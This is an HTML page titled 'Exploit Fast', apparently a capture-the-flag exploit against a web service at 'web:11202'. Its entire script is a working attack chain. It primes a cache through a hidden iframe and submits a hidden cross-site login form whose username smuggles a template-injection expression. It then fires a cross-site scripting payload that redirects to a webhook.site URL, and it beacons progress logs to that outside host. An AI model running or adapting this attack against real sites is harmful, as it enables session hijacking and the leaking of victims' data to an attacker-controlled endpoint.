<!DOCTYPE html>
<html>
<head>
    <title>Exploit Fast</title>
</head>
<body>
    <script>
        const WEB_URL = "http://web:11202";
        const WEBHOOK = "https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363";
        const PROBE_PAYLOAD = `<meta http-equiv="refresh" content="0;url=${WEBHOOK}?probe=success">`;
        
        const log = (msg) => new Image().src = `${WEBHOOK}?log=${encodeURIComponent(msg)}`;

        async function run() {
            log('Start Fast');

            // 1. Prime Cache (Parallel with Login setup)
            const cacheFrame = document.createElement('iframe');
            cacheFrame.src = WEB_URL + '/';
            cacheFrame.style.display = 'none';
            document.body.appendChild(cacheFrame);
            
            // Wait 500ms for cache
            await new Promise(r => setTimeout(r, 500));
            log('Cache done');

            // 2. Login CSRF
            const loginFrame = document.createElement('iframe');
            loginFrame.name = 'loginFrame';
            loginFrame.style.display = 'none';
            document.body.appendChild(loginFrame);
            
            const form = document.createElement('form');
            form.action = WEB_URL + '/login';
            form.method = 'POST';
            form.target = 'loginFrame';
            
            const u = document.createElement('input');
            u.type = 'hidden';
            u.name = 'username';
            u.value = '{request.query_params[x]}'; 
            form.appendChild(u);
            
            const p = document.createElement('input');
            p.type = 'hidden';
            p.name = 'password';
            p.value = 'password123';
            form.appendChild(p);
            
            document.body.appendChild(form);
            form.submit();
            
            // 3. Trigger XSS (Wait 500ms for login redirect)
            setTimeout(() => {
                log('Trigger XSS');
                const targetUrl = WEB_URL + '/?x=' + encodeURIComponent(PROBE_PAYLOAD);
                loginFrame.src = targetUrl;
            }, 500);
        }
        
        run();
    </script>
</body>
</html>
